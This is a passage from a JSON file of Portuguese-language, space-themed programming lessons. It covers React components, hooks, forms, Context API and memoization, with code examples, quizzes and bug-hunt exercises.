            "question": "Qual tipo específico deve ser informado ao querySelector para que o TypeScript saiba que o elemento retornado possui a propriedade .value de texto digitado?",
            "options": [
              "HTMLElement",
              "HTMLDivElement",
              "HTMLInputElement",
              "HTMLAnchorElement"
            ],
            "correctIndex": 2,
            "explanation": "HTMLInputElement contém todas as propriedades específicas de campos de entrada, incluindo value, checked, disabled e placeholder."
          },
          {
            "type": "bughunt",
            "title": "Correção de Tipagem de Evento do DOM",
            "scenario": "Um cadete declarou o evento de envio de formulário com o tipo MouseEvent, impedindo o compilador de reconhecer o evento adequadamente. Corrija o tipo do evento.",
            "buggyCode": "function lidarComEnvio(evento: MouseEvent) {\n  evento.preventDefault();\n}",
            "expectedKeywords": [
              "function lidarComEnvio(evento: SubmitEvent)",
              "evento.preventDefault()"
            ],
            "forbiddenKeywords": [
              "evento: MouseEvent"
            ],
            "hint": "Substitua MouseEvent pelo tipo de evento específico de envio de formulário: SubmitEvent.",
            "solutionExplanation": "Formulários disparam eventos do tipo SubmitEvent, não cliques simples de mouse."
          }
        ]
      }
    ]
  },
  {
    "id": "react",
    "slug": "react",
    "name": "React",
    "planetName": "React Nexus",
    "description": "Construa interfaces reativas, declarativas e componentes modulares reutilizáveis.",
    "icon": "⚛️",
    "color": "#61DAFB",
    "language": "tsx",
    "level": "Intermediário",
    "totalXp": 525,
    "lessons": [
      {
        "id": "react-1",
        "title": "1. Componentes Modulares, JSX & Props",
        "description": "Aprenda a pensar em componentes reutilizáveis e passar dados com propriedades.",
        "duration": 15,
        "xpReward": 65,
        "language": "tsx",
        "content": "# ⚛️ Componentes Modulares, JSX & Props\n\nBem-vindo a **React Nexus**! No desenvolvimento web tradicional, páginas eram escritas como blocos monolíticos de centenas de linhas.\n\nO **React**, criado pelo time de engenharia do Facebook/Meta, revolucionou a indústria com um conceito simples e genial: **dividir a interface em pequenos componentes independentes e reutilizáveis** (como blocos de LEGO).\n\n---\n\n### 🧩 O que é um Componente React?\n\nUm componente no React nada mais é do que uma **função JavaScript que retorna marcação visual (JSX)**:\n\n```tsx\nfunction BotaoDisparo() {\n  return (\n    <button className=\"btn-neon\">\n      Ativar Propulsor\n    </button>\n  );\n}\n```\n\n---\n\n### 📦 O que é JSX?\n\n**JSX** significa *JavaScript XML*. Ele permite escrever marcação semelhante a HTML diretamente dentro de funções JavaScript.\n\nPrincipais diferenças em relação ao HTML comum:\n1. Usamos `className` em vez de `class` (porque `class` é uma palavra reservada do JavaScript!).\n2. Todas as tags devem ser fechadas rigorosamente (ex: `<img />`, `<input />`, `<br />`).\n3. Expressões dinâmicas JavaScript ficam entre chaves: `<h1>{nomeDoCadete}</h1>`.\n\n---\n\n### 📬 Passando Dados com `props`\n\nComponentes tornam-se verdadeiramente poderosos quando são customizáveis através de **props** (parâmetros de entrada):\n\n```tsx\ninterface CardMissaoProps {\n  titulo: string;\n  recompensaXp: number;\n}\n\nfunction CardMissao({ titulo, recompensaXp }: CardMissaoProps) {\n  return (\n    <div className=\"card-missao\">\n      <h3>{titulo}</h3>\n      <p>Recompensa: +{recompensaXp} XP</p>\n    </div>\n  );\n}\n```\n\n> **💡 Dica Pro:**\n> Nomes de componentes React devem começar sempre com **letra maiúscula** (ex: `PainelControle`). Se começar com minúscula, o React acha que se trata de uma tag HTML nativa!\n\n> **⚠️ Armadilha Comum:**\n> Esquecer de importar o componente ou tentar retornar múltiplos elementos raiz sem envolvê-los em uma tag pai ou em um Fragment vazio (`<>...</>`).",
        "codeExample": "// Componente de Badge de Status da Estação\ninterface StatusBadgeProps {\n  status: \"ONLINE\" | \"OFFLINE\";\n}\n\nexport function StatusBadge({ status }: StatusBadgeProps) {\n  const isOnline = status === \"ONLINE\";\n\n  return (\n    <span className={isOnline ? \"badge-verde\" : \"badge-vermelho\"}>\n      {isOnline ? \"● Sistema Online\" : \"○ Sistema Offline\"}\n    </span>\n  );\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Por que no JSX do React utilizamos o atributo \"className\" em vez de \"class\" para aplicar classes de estilo CSS?",
            "options": [
              "Porque className é mais rápido para o compilador interpretar.",
              "Porque \"class\" é uma palavra reservada do JavaScript para declaração de classes orientadas a objetos.",
              "Porque o navegador Google Chrome proíbe o uso de class em bibliotecas modernas.",
              "Porque className adiciona suporte automático a CSS inline."
            ],
            "correctIndex": 1,
            "explanation": "Como o JSX é transformado em JavaScript puro por trás dos panos, usar a palavra-chave class geraria conflito com a sintaxe de classes ES6 do JavaScript."
          },
          {
            "type": "code",
            "instruction": "Crie um componente funcional chamado BotaoNexus que recebe a prop { rotulo }: { rotulo: string } e retorna um botão com classe \"btn-nexus\" exibindo o rotulo.",
            "initialCode": "// Crie o componente BotaoNexus abaixo\n",
            "expectedKeywords": [
              "function BotaoNexus",
              "rotulo",
              "className=\"btn-nexus\"",
              "{rotulo}",
              "</button>"
            ],
            "hint": "Escreva function BotaoNexus({ rotulo }: { rotulo: string }) { return <button className=\"btn-nexus\">{rotulo}</button>; }.",
            "solution": "function BotaoNexus({ rotulo }: { rotulo: string }) {\n  return <button className=\"btn-nexus\">{rotulo}</button>;\n}"
          },
          {
            "type": "bughunt",
            "title": "Sintaxe Corrompida no JSX do Card",
            "scenario": "O desenvolvedor júnior tentou criar o card do piloto, mas cometeu dois erros clássicos de JSX: usou \"class\" em vez de \"className\" e esqueceu de fechar a tag de imagem.",
            "buggyCode": "function CardPiloto() {\n  return (\n    <div class=\"card-piloto\">\n      <h2>Comandante</h2>\n      <img src=\"avatar.png\" alt=\"Avatar\">\n    </div>\n  );\n}",
            "expectedKeywords": [
              "className=\"card-piloto\"",
              "<img src=\"avatar.png\" alt=\"Avatar\" />"
            ],
            "forbiddenKeywords": [
              "class=\"card-piloto\"",
              "<img src=\"avatar.png\" alt=\"Avatar\">"
            ],
            "hint": "Substitua class por className na div e feche a tag de imagem com uma barra no final (ex: <img ... />).",
            "solutionExplanation": "Show de bola! Com className e a tag de imagem com fechamento automático (<img ... />), o JSX volta a ser 100% válido no React."
          }
        ]
      },
      {
        "id": "react-2",
        "title": "2. O Pulso do Componente: Estado com useState",
        "description": "Faça seus componentes reagirem dinamicamente a cliques e interações do usuário.",
        "duration": 16,
        "xpReward": 65,
        "language": "tsx",
        "content": "# 💓 O Pulso do Componente: Estado com useState\n\nComponentes estáticos são úteis, mas a verdadeira mágica do React acontece quando as telas **reagem** às ações dos usuários: contadores que sobem, modais que abrem, formulários que validam.\n\nPara guardar informações mutáveis dentro de um componente, usamos o **Hook `useState`**.\n\n---\n\n### 🎣 Anatomia do `useState`\n\n```tsx\nimport { useState } from 'react';\n\nfunction PainelEscudo() {\n  const [escudos, setEscudos] = useState(100);\n\n  const tomarDano = () => {\n    setEscudos(escudos - 15);\n  };\n\n  return (\n    <div>\n      <p>Nível dos Escudos: {escudos}%</p>\n      <button onClick={tomarDano}>Receber Impacto</button>\n    </div>\n  );\n}\n```\n\nO `useState` devolve um array com exatamente 2 itens:\n1. **O valor atual do estado** (`escudos`).\n2. **A função atualizadora** (`setEscudos`), que avisa ao React que o dado mudou e aciona a re-renderização da tela!\n\n---\n\n### 🛡️ Regra Inegociável: Imutabilidade\n\nVocê **NUNCA** deve alterar a variável de estado diretamente:\n\n```tsx\n// ❌ PROIBIDO: O React não detecta a mudança e a tela não atualiza!\nescudos = 50;\n\n// ✅ CORRETO: Chama a função atualizadora\nsetEscudos(50);\n```\n\n> **💡 Dica Pro:**\n> Quando o próximo estado depende do estado anterior, use uma função de atualização: `setContador(prev => prev + 1)`. Isso evita bugs de concorrência!\n\n> **⚠️ Armadilha Comum:**\n> Chamar a função atualizadora diretamente no corpo do componente (fora de um evento ou `useEffect`) causa um loop infinito de renderização fatal.",
        "codeExample": "import { useState } from 'react';\n\nexport function ContadorMissoes() {\n  const [concluidas, setConcluidas] = useState(0);\n\n  return (\n    <div className=\"painel-missoes\">\n      <h3>Missões Concluídas: {concluidas}</h3>\n      <button onClick={() => setConcluidas(concluidas + 1)}>\n        +1 Missão Finalizada\n      </button>\n    </div>\n  );\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Por que não devemos modificar uma variável de estado diretamente no React (ex: contador = 5) em vez de usar setContador(5)?",
            "options": [
              "Porque variáveis no React são protegidas contra gravação pelo navegador.",
              "Porque o React só detecta alterações e dispara a atualização visual da tela quando usamos a função atualizadora.",
              "Porque modificar variáveis diretamente trava a placa de vídeo do computador.",
              "Porque o React só aceita valores booleanos no estado."
            ],
            "correctIndex": 1,
            "explanation": "O React monitora as chamadas à função atualizadora para recalcular o DOM virtual e atualizar os pixels certos na tela com máxima eficiência."
          },
          {
            "type": "fillblank",
            "title": "Configurando o Estado dos Propulsores",
            "instruction": "Complete a desestruturação do hook useState para gerenciar o estado da potência dos propulsores.",
            "codeSnippet": "const [potencia, {{funcao_atualizadora}}] = useState(50);",
            "blanks": [
              {
                "id": "funcao_atualizadora",
                "placeholder": "função atualizadora",
                "expectedValues": [
                  "setPotencia",
                  "setPotência"
                ],
                "hint": "Por convenção universal no React, a função atualizadora usa o prefixo \"set\" seguido do nome da variável em CamelCase."
              }
            ],
            "explanation": "Exato! A convenção [valor, setValor] é um dos padrões mais reconhecíveis do ecossistema React mundial."
          }
        ]
      },
      {
        "id": "react-3",
        "title": "3. Efeitos Colaterais & Ciclo com useEffect",
        "description": "Sincronize componentes com o mundo exterior: requisições, listeners de eventos e timers com useEffect.",
        "duration": 16,
        "xpReward": 65,
        "language": "tsx",
        "content": "# ⚛️ Efeitos Colaterais & Ciclo com useEffect\n\nBem-vindo ao setor de sincronização de React Nexus! Em React, a renderização de componentes deve ser pura. Para realizar ações que afetam o mundo exterior — buscar dados de uma API, assinar eventos ou manipular timers —, usamos o hook **useEffect**.\n\n> **💡 O que é um Efeito Colateral (Side Effect)?**\n> É qualquer operação que interaja fora do escopo estrito da renderização da função do componente: chamadas de rede (`fetch`), gravação no `localStorage`, manipulação direta do título da aba ou subscrições a websockets.\n\n---\n\n### ⏱️ Anatomia do `useEffect` e o Array de Dependências\n\n```tsx\nimport { useState, useEffect } from 'react';\n\nexport function MonitorNave() {\n  const [telemetria, setTelemetria] = useState(null);\n\n  useEffect(() => {\n    // 1. Ação executada após o componente ser montado na tela\n    async function carregarDados() {\n      const res = await fetch('/api/telemetria');\n      const dados = await res.json();\n      setTelemetria(dados);\n    }\n\n    carregarDados();\n\n    // 2. Função de limpeza (cleanup) opcional: executada na desmontagem!\n    return () => {\n      console.log('Monitor desconectado com sucesso');\n    };\n  }, []); // Array vazio = executa APENAS UMA VEZ na montagem!\n\n  return <div>Status: {telemetria ? 'Online' : 'Conectando...'}</div>;\n}\n```\n\n- **Array vazio (`[]`):** Executa uma única vez quando o componente surge na tela.\n- **Com dependências (`[id, pagina]`):** Executa novamente sempre que alguma dessas variáveis sofrer alteração.\n- **Sem array de dependências:** Cuidado! Executará em TODAS as renderizações do componente!\n\n---\n\n### 🧹 A Função de Limpeza (*Cleanup*)\n\nSe o seu efeito cria um `setInterval` ou um `addEventListener`, você DEVE retornar uma função de limpeza para evitar vazamento de memória (*memory leaks*):\n\n```tsx\nuseEffect(() => {\n  const timer = setInterval(() => {\n    console.log('Pulso de reator...');\n  }, 1000);\n\n  return () => clearInterval(timer); // Limpa o timer ao desmontar!\n}, []);\n```\n\n> **⚠️ Armadilha Comum:**\n> Modificar um estado dentro de um `useEffect` sem declarar dependências. Isso causa loops infinitos de renderização que travam o navegador do usuário!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Sempre declare no array de dependências todas as variáveis e props usadas dentro do efeito.\n- Não use `useEffect` para calcular valores que poderiam ser computados diretamente durante a renderização.\n\n> **🛡️ Regra de Ouro:**\n> Todo efeito que abre uma conexão ou escuta um evento contínuo deve ter sua respectiva contraparte de fechamento na função de retorno.",
        "codeExample": "import { useState, useEffect } from 'react';\n\nexport function RelogioEstelar() {\n  const [hora, setHora] = useState(new Date().toLocaleTimeString());\n\n  useEffect(() => {\n    const id = setInterval(() => {\n      setHora(new Date().toLocaleTimeString());\n    }, 1000);\n\n    return () => clearInterval(id);\n  }, []);\n\n  return <h2>Horário Nexus: {hora}</h2>;\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "O que acontece quando passamos um array vazio ([]) como segundo argumento da função useEffect?",
            "options": [
              "O efeito é desativado e nunca será executado.",
              "O efeito roda apenas uma vez, imediatamente após a primeira montagem do componente na tela.",
              "O efeito é disparado a cada atualização de qualquer estado do componente.",
              "O componente é automaticamente desinstalado da árvore de renderização."
            ],
            "correctIndex": 1,
            "explanation": "Um array de dependências vazio significa que o efeito não depende de nenhum valor de props ou estado, executando apenas na montagem inicial."
          },
          {
            "type": "code",
            "instruction": "Escreva um hook useEffect com array de dependências vazio que defina o título da página (document.title) como \"Base Nexus\".",
            "initialCode": "// Escreva o useEffect aqui\n",
            "expectedKeywords": [
              "useEffect(() => {",
              "document.title =",
              "\"Base Nexus\"",
              "}, []);"
            ],
            "hint": "Use a sintaxe: useEffect(() => { document.title = \"Base Nexus\"; }, []);",
            "solution": "useEffect(() => {\n  document.title = \"Base Nexus\";\n}, []);"
          }
        ]
      },
      {
        "id": "react-4",
        "title": "4. Renderização Condicional e Listas com Keys",
        "description": "Renderize coleções dinâmicas com .map() e chave única key, e alterne interfaces com ternários e &&.",
        "duration": 15,
        "xpReward": 65,
        "language": "tsx",
        "content": "# 🔀 Renderização Condicional e Listas com Keys\n\nConstruindo painéis inteligentes em React Nexus! Interfaces modernas precisam se transformar com base no estado: exibir telas de carregamento, alternar botões ou listar dezenas de itens dinâmicos.\n\n> **💡 O que é Renderização Condicional?**\n> É a capacidade do React de renderizar diferentes elementos JSX ou componentes com base em condições lógicas em tempo de execução (usando `&&`, ternários `? :` ou `if`).\n\n---\n\n### 🛡️ Operadores Condicionais no JSX\n\n```tsx\nexport function PainelCadete({ cadete, carregando }) {\n  // 1. Retorno antecipado (Early return)\n  if (carregando) {\n    return <p>Sincronizando satélites...</p>;\n  }\n\n  return (\n    <div>\n      {/* 2. Operador ternário para escolher entre dois blocos */}\n      {cadete ? <h2>Olá, {cadete.nome}!</h2> : <h2>Acesso Negado</h2>}\n\n      {/* 3. Operador && para exibir algo apenas se for verdadeiro */}\n      {cadete?.eComandante && (\n        <button className=\"bg-red-600\">Painel de Armas</button>\n      )}\n    </div>\n  );\n}\n```\n\n---\n\n### 📋 Listas Dinâmicas e a Importância Vital da `key`\n\nPara transformar uma lista de dados em elementos JSX, usamos `.map()`:\n\n```tsx\nexport function ListaPlanetas({ planetas }) {\n  return (\n    <ul>\n      {planetas.map((planeta) => (\n        // A propriedade key deve ser colocada no elemento mais externo retornado!\n        <li key={planeta.id}>\n          <span>{planeta.icone}</span>\n          <strong>{planeta.nome}</strong>\n        </li>\n      ))}\n    </ul>\n  );\n}\n```\n\n- **Por que a `key` é obrigatória?** A chave é o identificador único que o algoritmo de reconciliação do React (*Virtual DOM*) usa para saber qual item foi adicionado, alterado ou removido sem precisar redesenhar a lista inteira.\n\n> **⚠️ Armadilha Comum:**\n> Usar o índice do array como chave (`key={index}`). Se a lista for reordenada, filtrada ou tiver itens excluídos, usar índices causa bugs gráficos gravíssimos em inputs e animações! Use sempre um ID único do dado.\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- A `key` deve ser única entre irmãos da lista, mas não precisa ser globalmente única na aplicação inteira.\n- Cuidado com `array.length && <Componente />`: se o tamanho for `0`, o React renderizará o número `0` na tela! Prefira `array.length > 0 && <Componente />`.\n\n> **🛡️ Regra de Ouro:**\n> Utilize sempre identificadores únicos e estáveis (como IDs de banco de dados) para a prop `key`.",
        "codeExample": "interface Missao {\n  id: string;\n  titulo: string;\n  concluida: boolean;\n}\n\nexport function ListaMissoes({ missoes }: { missoes: Missao[] }) {\n  return (\n    <div className=\"espaco-y-2\">\n      {missoes.map(m => (\n        <div key={m.id} className=\"p-3 border rounded\">\n          <h4>{m.titulo}</h4>\n          {m.concluida ? <span>✅ Concluída</span> : <span>⏳ Em curso</span>}\n        </div>\n      ))}\n    </div>\n  );\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Por que é fortemente desencorajado utilizar o índice do array (index) como prop \"key\" em listas do React?",
            "options": [
              "Porque o React não aceita números como valores de key.",
              "Porque se a lista for reordenada ou itens forem excluídos, o índice causa falhas na reconciliação de estado dos componentes.",
              "Porque o índice reduz a performance de rede da aplicação.",
              "Porque índices violam as diretrizes de acessibilidade W3C."
            ],
            "correctIndex": 1,
            "explanation": "O índice não é um identificador estável: quando itens são adicionados ou reordenados, seus índices mudam, confundindo a reconciliação do Virtual DOM."
          },
          {
            "type": "code",
            "instruction": "Dado um array \"itens\" contendo objetos com \"id\" e \"texto\", complete o JSX renderizando uma tag <li> para cada item com a prop key configurada.",
            "initialCode": "<ul>\n  {/* Mapeie os itens aqui */}\n</ul>",
            "expectedKeywords": [
              "itens.map",
              "key={item.id}",
              "{item.texto}",
              "</li>"
            ],
            "hint": "Use: itens.map(item => <li key={item.id}>{item.texto}</li>)",
            "solution": "<ul>\n  {itens.map(item => (\n    <li key={item.id}>{item.texto}</li>\n  ))}\n</ul>"
          }
        ]
      },
      {
        "id": "react-5",
        "title": "5. Formulários Controlados e Inputs no React",
        "description": "Gerencie campos de entrada com a filosofia de Componentes Controlados (Controlled Components).",
        "duration": 16,
        "xpReward": 65,
        "language": "tsx",
        "content": "# 📝 Formulários Controlados e Inputs no React\n\nMódulos de entrada em React Nexus! Em HTML tradicional, os campos de formulário guardam seu próprio valor internamente. No React profissional, o estado da aplicação é a única fonte da verdade através de **Componentes Controlados**.\n\n> **💡 O que é um Componente Controlado?**\n> Um input cujo valor exibido é ditado pelo estado do React (`value={estado}`) e cujas alterações são interceptadas por um manipulador de evento (`onChange={e => setEstado(e.target.value)}`).\n\n---\n\n### 🕹️ O Ciclo do Input Controlado\n\n```tsx\nimport { useState } from 'react';\n\nexport function FormularioRegistro() {\n  const [identificacao, setIdentificacao] = useState('');\n  const [setor, setSetor] = useState('alfa');\n\n  function handleSubmit(e: React.FormEvent) {\n    e.preventDefault(); // Impede o recarregamento padrão da página!\n    console.log('Enviando dados do cadete:', { identificacao, setor });\n  }\n\n  return (\n    <form onSubmit={handleSubmit}>\n      <label>\n        Nome de Guerra:\n        <input\n          type=\"text\"\n          value={identificacao}\n          onChange={(e) => setIdentificacao(e.target.value)}\n          placeholder=\"Ex: Hunter-9\"\n        />\n      </label>\n\n      <label>\n        Setor de Lotação:\n        <select value={setor} onChange={(e) => setSetor(e.target.value)}>\n          <option value=\"alfa\">Setor Alfa</option>\n          <option value=\"beta\">Setor Beta</option>\n        </select>\n      </label>\n\n      <button type=\"submit\">Confirmar Embarque</button>\n    </form>\n  );\n}\n```\n\n---\n\n### 🎛️ Gerenciando Múltiplos Campos com um Único Objeto\n\nQuando o formulário tem muitos campos, podemos centralizar em um único estado:\n\n```tsx\nconst [form, setForm] = useState({ nome: '', email: '', bio: '' });\n\nfunction handleChange(e: React.ChangeEvent<HTMLInputElement>) {\n  const { name, value } = e.target;\n  setForm(prev => ({\n    ...prev,\n    [name]: value // Chave computada dinâmica!\n  }));\n}\n```\n\n> **⚠️ Armadilha Comum:**\n> Esquecer o `e.preventDefault()` no evento `onSubmit`. O navegador executará a ação padrão do HTML, submetendo uma requisição GET/POST e recarregando a página inteira, zerando todo o estado do React!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Desabilite o botão de envio enquanto a requisição estiver pendente (`disabled={enviando}`) para evitar submissões duplicadas.\n- Limpe os campos após o envio bem-sucedido redefinindo o estado para seu valor inicial.\n\n> **🛡️ Regra de Ouro:**\n> O estado do React deve ditar o que a tela mostra, e a interação do usuário deve atualizar esse estado.",
        "codeExample": "export function InputBusca() {\n  const [termo, setTermo] = useState('');\n\n  return (\n    <div className=\"campo-pesquisa\">\n      <input\n        type=\"search\"\n        value={termo}\n        onChange={(e) => setTermo(e.target.value)}\n        placeholder=\"Buscar coordenadas...\"\n      />\n      {termo && <button onClick={() => setTermo('')}>Limpar</button>}\n    </div>\n  );\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Em um componente controlado no React, quais duas propriedades são essenciais na tag <input> para sincronizá-la com o estado?",
            "options": [
              "src e alt",
              "value e onChange",
              "id e className",
              "href e target"
            ],
            "correctIndex": 1,
            "explanation": "A propriedade value vincula o que é exibido ao estado, e onChange atualiza esse estado a cada caractere digitado."
          },
          {
            "type": "code",
            "instruction": "Crie uma tag <input> controlada onde a propriedade value seja vinculada à variável \"nome\" e o evento onChange chame \"setNome(e.target.value)\".",
            "initialCode": "{/* Escreva o input controlado aqui */}\n",
            "expectedKeywords": [
              "<input",
              "value={nome}",
              "onChange={(e) => setNome(e.target.value)}"
            ],
            "hint": "Use: <input value={nome} onChange={(e) => setNome(e.target.value)} />",
            "solution": "<input value={nome} onChange={(e) => setNome(e.target.value)} />"
          }
        ]
      },
      {
        "id": "react-6",
        "title": "6. Compartilhando Estado com Context API",
        "description": "Elimine o Prop Drilling distribuindo dados globais como usuário logado e tema através do createContext.",
        "duration": 17,
        "xpReward": 65,
        "language": "tsx",
        "content": "# 🌐 Compartilhando Estado com Context API\n\nConexão neural em React Nexus! Conforme sua aplicação cresce, passar dados de pai para filho através de 5 ou 6 níveis de profundidade (*Prop Drilling*) torna-se um pesadelo de manutenção. A **Context API** resolve isso criando um canal direto de teletransporte de dados.\n\n> **💡 O que é a Context API?**\n> É o mecanismo oficial do React para compartilhar dados que podem ser considerados \"globais\" para uma árvore de componentes, como o usuário autenticado atual, idioma da frota ou tema visual.\n\n---\n\n### 📡 Os 3 Passos da Context API\n\n1. **Criar o Contexto:**\n```tsx\nimport { createContext, useContext, useState, ReactNode } from 'react';\n\ninterface AuthContextType {\n  usuario: string | null;\n  login: (nome: string) => void;\n  logout: () => void;\n}\n\nconst AuthContext = createContext<AuthContextType | undefined>(undefined);\n```\n\n2. **Provedor (*Provider*):** Envolve a aplicação e fornece o valor:\n```tsx\nexport function AuthProvider({ children }: { children: ReactNode }) {\n  const [usuario, setUsuario] = useState<string | null>(null);\n\n  const login = (nome: string) => setUsuario(nome);\n  const logout = () => setUsuario(null);\n\n  return (\n    <AuthContext.Provider value={{ usuario, login, logout }}>\n      {children}\n    </AuthContext.Provider>\n  );\n}\n```\n\n3. **Consumir com o Hook `useContext`:**\n```tsx\nexport function useAuth() {\n  const contexto = useContext(AuthContext);\n  if (!contexto) {\n    throw new Error('useAuth deve ser utilizado dentro de um AuthProvider');\n  }\n  return contexto;\n}\n\n// Em qualquer componente filho:\nexport function PerfilTopo() {\n  const { usuario, logout } = useAuth();\n  return <div>Cadete: {usuario} <button onClick={logout}>Sair</button></div>;\n}\n```\n\n> **⚠️ Armadilha Comum:**\n> Colocar estados que mudam a cada milissegundo (como a posição do cursor do mouse) em um Contexto no topo do app. Quando o valor do contexto muda, **todos** os componentes consumidores se renderizam novamente! Para estados ultrarrápidos e complexos, ferramentas como Zustand ou Redux são mais especializadas.\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Crie sempre um hook customizado (ex: `useAuth()`) que já valide se o contexto não é `undefined`.\n- Divida contextos por responsabilidade (um para `ThemeContext`, outro para `AuthContext`) em vez de um único megacontexto global.\n\n> **🛡️ Regra de Ouro:**\n> Use Context apenas para dados que realmente precisam ser acessados por muitos componentes em níveis diferentes da árvore.",
        "codeExample": "const TemaContext = createContext<'neon' | 'dark'>('dark');\n\nexport function BotaoTema() {\n  const tema = useContext(TemaContext);\n  return <button className={`btn-${tema}`}>Tema Atual: {tema}</button>;\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual problema arquitetural a Context API do React resolve de maneira nativa?",
            "options": [
              "Acelera a compilação de arquivos TypeScript.",
              "Evita o \"Prop Drilling\", que é a necessidade de passar props manualmente por múltiplos componentes intermediários que não precisam delas.",
              "Permite conectar o React a um banco de dados SQL diretamente sem servidor backend.",
              "Converte automaticamente código JSX para HTML sem o Virtual DOM."
            ],
            "correctIndex": 1,
            "explanation": "A Context API fornece uma maneira de passar dados através da árvore de componentes sem precisar descer props manualmente em cada nível (Prop Drilling)."
          },
          {
            "type": "fillblank",
            "title": "Configurando um Provedor de Contexto",
            "instruction": "Preencha a tag do componente provedor do contexto TemaContext.",
            "codeSnippet": "<TemaContext.___ value=\"cyberpunk\">\n  <App />\n</TemaContext.___>",
            "blanks": [
              {
                "id": "blank-1",
                "placeholder": "componente provedor",
                "expectedValues": [
                  "Provider"
                ],
                "hint": "A propriedade interna do Context responsável por prover os valores para os filhos."
              },
              {
                "id": "blank-2",
                "placeholder": "fechamento do provedor",
                "expectedValues": [
                  "Provider"
                ],
                "hint": "O mesmo componente utilizado na tag de abertura."
              }
            ],
            "explanation": "A sintaxe <Contexto.Provider value={...}> é a forma padrão de disponibilizar valores contextuais aos filhos."
          }
        ]
      },
      {
        "id": "react-7",
        "title": "7. Otimização com useMemo e useCallback",
        "description": "Turbine a performance da interface memorizando cálculos caros e referências de funções.",
        "duration": 16,
        "xpReward": 65,
        "language": "tsx",
        "content": "# 🚀 Otimização com useMemo e useCallback\n\nPropulsores quânticos em React Nexus! Em aplicações de alto desempenho, evitar recálculos desnecessários e impedir re-renderizações inúteis de componentes pesados é uma prioridade estratégica.\n\n> **💡 O que é Memorização (Memoization)?**\n> Memorizar significa armazenar o resultado de uma operação computacional em cache para que, quando os mesmos parâmetros forem fornecidos, o resultado seja devolvido instantaneamente sem repetir o processamento.\n\n---\n\n### 🧠 `useMemo`: Guardando Resultados de Cálculos Caros\n\n```tsx\nimport { useMemo } from 'react';\n\nexport function RelatorioPlanetas({ listaNaves, filtro }) {\n  // Executa o filtro pesado APENAS se listaNaves ou filtro mudarem!\n  const navesFiltradas = useMemo(() => {\n    console.log('Executando cálculo quântico pesado...');\n    return listaNaves.filter(nave => nave.potencia > 5000 && nave.setor === filtro);\n  }, [listaNaves, filtro]);\n\n  return <div>Naves Prontas: {navesFiltradas.length}</div>;\n}\n```\n\n---\n\n### 🎯 `useCallback`: Preservando a Referência de Funções\n\nEm JavaScript, toda vez que uma função de componente é executada, **novas funções são criadas na memória com novas referências**:\n\n```tsx\nimport { useCallback, useState } from 'react';\n\nexport function TerminalControle() {\n  const [contador, setContador] = useState(0);\n\n  // Memoriza a referência da função entre renderizações\n  const dispararMissil = useCallback((coordenada: string) => {\n    console.log('Míssil disparado nas coordenadas:', coordenada);\n  }, []); // Referência estável!\n\n  return <BotaoDisparo onDisparar={dispararMissil} />;\n}\n```\n\n- Ao passar `dispararMissil` para um componente filho otimizado com `React.memo`, o filho **não será re-renderizado** desnecessariamente porque a referência da função continuou a mesma!\n\n> **⚠️ Armadilha Comum:**\n> Usar `useMemo` e `useCallback` em absolutamente tudo! A memorização também tem um custo de memória e processamento para comparar arrays de dependência. Só use quando o cálculo for verdadeiramente custoso ou ao passar callbacks para componentes filhos memorizados.\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Meça antes de otimizar: use o React DevTools Profiler para identificar componentes que estão sofrendo renderizações lentas.\n- Sempre declare todas as dependências usadas dentro do callback ou memo.\n\n> **🛡️ Regra de Ouro:**\n> Otimização prematura é a raiz de muitos bugs. Escreva código limpo primeiro; otimize onde os gargalos forem comprovados.",
        "codeExample": "const totalPontos = useMemo(() => {\n  return itens.reduce((soma, item) => soma + item.pontos, 0);\n}, [itens]);",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual é a diferença fundamental entre useMemo e useCallback?",
            "options": [
              "useMemo memoriza o valor retornado por uma função de cálculo, enquanto useCallback memoriza a própria referência da função.",
              "useMemo é executado no servidor, enquanto useCallback só roda no navegador do cliente.",
              "useCallback é obrigatório em todos os botões do formulário.",
              "useMemo não aceita array de dependências."
            ],
            "correctIndex": 0,
            "explanation": "useMemo(() => fn(), deps) memoriza o resultado do cálculo, enquanto useCallback(fn, deps) memoriza a própria instância da função."
          },
          {
            "type": "code",
            "instruction": "Utilize useMemo para memorizar o cálculo de \"valorDuplicado\" a partir da variável \"contador\", dependendo de [contador].",
            "initialCode": "// Crie a constante valorDuplicado aqui usando useMemo\n",
            "expectedKeywords": [
              "const valorDuplicado = useMemo(",
              "contador * 2",
              "[contador]"
            ],
            "hint": "Use: const valorDuplicado = useMemo(() => contador * 2, [contador]);",
            "solution": "const valorDuplicado = useMemo(() => contador * 2, [contador]);"
          }
        ]
      },
      {
        "id": "react-8",
        "title": "8. Custom Hooks: Modularizando a Lógica da UI",
        "description": "Extraia lógicas de estado reutilizáveis e limpas criando seus próprios Custom Hooks com prefixo use.",
        "duration": 17,
        "xpReward": 70,
        "language": "tsx",
        "content": "# 🧩 Custom Hooks: Modularizando a Lógica da UI\n\nMissão de graduação em React Nexus! O ápice do desenvolvimento limpo em React é a capacidade de **desacoplar completamente a lógica de negócios da interface visual** criando seus próprios **Custom Hooks**.\n\n> **💡 O que é um Custom Hook?**\n> É uma função JavaScript cujo nome começa obrigatoriamente com o prefixo `use` (como `useFetch`, `useLocalStorage`) e que pode chamar outros hooks do React internamente (`useState`, `useEffect`).\n\n---\n\n### 🛠️ Criando o Hook `useDebounce`\n\nUm clássico para campos de busca que evita disparar requisições a cada tecla:\n\n```tsx\nimport { useState, useEffect } from 'react';\n\nexport function useDebounce<T>(valor: T, atrasoMs: number = 500): T {\n  const [valorDebounced, setValorDebounced] = useState<T>(valor);\n\n  useEffect(() => {\n    const timer = setTimeout(() => {\n      setValorDebounced(valor);\n    }, atrasoMs);\n\n    return () => clearTimeout(timer);\n  }, [valor, atrasoMs]);\n\n  return valorDebounced;\n}\n```\n\n---\n\n### 📱 Consumindo o Custom Hook no Componente\n\nO componente fica incrivelmente limpo, focado exclusivamente no 